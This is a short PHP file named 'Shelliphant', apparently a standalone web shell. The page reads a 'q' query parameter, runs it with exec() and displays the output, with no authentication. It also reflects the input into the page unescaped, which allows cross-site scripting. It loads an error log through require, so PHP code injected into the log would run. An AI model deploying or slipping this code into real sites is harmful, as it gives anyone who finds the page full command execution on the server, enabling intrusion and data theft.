<?php

$output = "No Command.";

$q = "";

if(isset($_GET["q"]) and !empty($_GET["q"])){
	$outputArray = [];
	$q = $_GET["q"];
	exec($q, $outputArray);
	$output = "";
	foreach ($outputArray as $key => $value) {
		$output .= $key . " " . $value . "\n";
	}
}


?><!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">

    <title>Shelliphant</title>
  </head>
  <body>
    
    <div class="container pt-5">
      <div class="row">
        <div class="col-md-12">
          <form>
            <div class="form-group">
              <label for="q">Query String</label>
              <input type="text" name="q" id="q" class="form-control" value="<?=$q?>" autofocus>
            </div>
            <div class="form-group">
              <button class="btn btn-primary">Execute</button>
            </div>
          </form>
          <div class="card my-5">
            <div class="card-header">
              <h3 class="card-title">Output</h3>
            </div>
            <pre class="card-body"><?=$output?></pre>
          </div>
          <div class="card">
            <div class="card-header">
              <h3 class="card-title">PHP Error Log</h3>
            </div>
            <pre class="card-body"><?php if(file_exists("php_errors.log")) require "php_errors.log"; ?></pre>
          </div>
        </div>        
      </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
  </body>
</html>